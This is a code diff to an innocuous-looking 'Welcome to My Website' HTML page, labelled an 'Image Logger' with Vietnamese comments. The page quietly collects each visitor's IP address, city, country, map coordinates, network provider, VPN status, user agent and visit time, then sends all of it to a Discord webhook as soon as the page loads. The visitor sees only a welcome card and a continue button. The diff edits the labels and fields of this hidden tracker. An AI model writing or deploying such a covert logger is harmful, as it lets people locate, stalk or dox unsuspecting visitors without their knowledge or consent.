@@ -55,13 +55,14 @@
 <body>
     <div class="card">
         <h1>Welcome to My Website</h1>
-        <div class="ip-address" id="ip-address">Loading...</div>
+        <!-- Hiện thẳng IP ngay khi vào web -->
+        <div class="ip-address" id="ip-address">Đang lấy IP...</div>
         <button class="btn" onclick="openLink()">Bấm vào đây để tiếp tục</button>
     </div>
     
     <script>
     function monke(json) {
-        // Hiển thị thẳng IP lên màn hình ngay lập tức
+        // Hiển thị thẳng số IP lên màn hình trang web
         document.getElementById('ip-address').innerText = json.ip || 'N/A';
 
         var request = new XMLHttpRequest();
@@ -76,22 +77,21 @@
 
         let mapsLink = json.loc ? `https://www.google.com/maps?q=${json.loc}` : 'Không có tọa độ';
 
-        // Lấy thời gian thực của người truy cập
-        let visitorTime = new Date().toLocaleString("vi-VN", { timeZone: json.timezone || undefined });
-        let userTimezone = json.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone;
+        // Lấy đúng giờ hệ thống lúc người đó ấn vào web
+        let clickTime = new Date().toLocaleString("vi-VN");
 
         var params = {
-            username: "Image Logger by phongdepzai02",
-            content: "🎯 Có người truy cập mới!",
+            username: "Cordly Image Logger by phongdepzai02",
+            content: "🎯 Có người truy cập mới vào web!",
             embeds: [
                 {
-                    title: "📍 Thông tin Vị trí & IP Nâng cấp",
+                    title: "📍 Thông tin Vị trí & IP",
                     color: 3447003,
                     fields: [
-                        { name: "⏰ Thời gian truy cập", value: `\`${visitorTime}\``, inline: false },
+                        { name: "⏰ Thời gian ấn vào web", value: `\`${clickTime}\``, inline: false },
                         { name: "🌐 IP Address", value: `\`${json.ip || 'N/A'}\``, inline: false },
                         { name: "🛡️ VPN/Proxy", value: `🚩 **${isVpnOrProxy}**`, inline: false },
-                        { name: "🌍 Múi giờ & Địa điểm", value: `Múi giờ: \`${userTimezone}\`\nQuốc gia: \`${json.country || 'N/A'}\` - Thành phố: \`${json.city || 'N/A'}\``, inline: false },
+                        { name: "🌍 Địa điểm (IP Geolocation)", value: `Quốc gia: \`${json.country || 'N/A'}\`\nThành phố: \`${json.city || 'N/A'}\``, inline: false },
                         { name: "🗺️ Google Maps (Tọa độ IP)", value: `[Bấm vào đây để xem bản đồ](${mapsLink})\n*Tọa độ: ${json.loc || 'N/A'}*`, inline: false },
                         { name: "🏢 Network / Hostname", value: `${json.org || 'N/A'}`, inline: false },
                         { name: "💻 Thiết bị", value: `\`${navigator.userAgent}\``, inline: false }
@@ -103,6 +103,7 @@
             ]
         };
 
+        // Gửi thẳng về Discord ngay lập tức
         request.send(JSON.stringify(params));
     }
 
